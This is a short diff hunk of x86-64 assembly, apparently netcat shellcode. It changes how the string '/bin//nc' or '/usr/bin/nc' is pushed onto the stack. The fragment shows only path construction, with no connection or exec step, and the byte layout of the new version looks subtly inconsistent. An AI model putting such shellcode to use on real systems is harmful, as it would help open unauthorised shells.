@@ -10,7 +10,9 @@ main:
         xor %rdi, %rdi
         
       
-        mov  $0x636e2f2f6e69622f, %rdi  #/bin//nc
+        mov  $0x636e2f2f, %rdi  #/usr/bin/nc
+        push %rdi
+        mov  $0x6e69622f7273752f, %rdi
         push %rdi
         lea (%rsp), %rdi
 
